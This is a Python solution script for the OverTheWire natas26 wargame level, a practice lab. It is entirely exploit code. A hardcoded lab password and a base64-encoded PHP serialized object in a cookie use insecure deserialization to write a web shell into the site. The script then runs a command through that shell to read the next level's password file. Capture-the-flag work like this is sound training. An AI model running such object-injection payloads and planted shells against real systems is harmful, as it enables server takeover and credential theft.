import requests
import base64

username = 'natas26'
password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'

url = "http://%s.natas.labs.overthewire.org" % username

payload = 'Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czoyNjoiPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4iO3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNjoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvc2hlbGwucGhwIjt9'
cookies = {
    'drawing': payload
}

r = requests.get(url, cookies=cookies, auth=(username,password))
params = {
    'c': 'cat /etc/natas_webpass/natas27'
}
r = requests.get(f'{url}/img/shell.php', params=params, auth=(username, password))
print(r.text)